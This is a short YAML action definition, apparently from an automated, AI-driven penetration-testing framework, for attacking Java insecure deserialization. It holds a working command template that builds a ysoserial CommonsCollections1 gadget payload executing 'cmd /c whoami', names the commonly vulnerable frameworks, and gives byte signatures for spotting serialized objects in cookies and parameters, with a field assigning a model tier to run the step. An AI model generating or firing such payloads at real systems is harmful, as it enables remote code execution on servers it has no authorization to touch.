name: insecure_deserialization_java
category: web
description: Java deserialization (ysoserial)
preconditions:
  - service.port==80
parameters:
  target_ip: from_engagement.target_ip
command_template: "java -jar ysoserial.jar CommonsCollections1 'cmd /c whoami' | base64"
parser: null
expected_effects:
  - action_completed
falsifier:
  pattern: "error|failed|refused|denied"
  timeout: 30
model_tier: haiku
mechanism: "Java ObjectInputStream.readObject() with gadget chains. Common frameworks: Apache Commons, Spring, WebLogic. Detect: rO0AB (base64) or ac ed 00 05 (hex) in cookies/params."
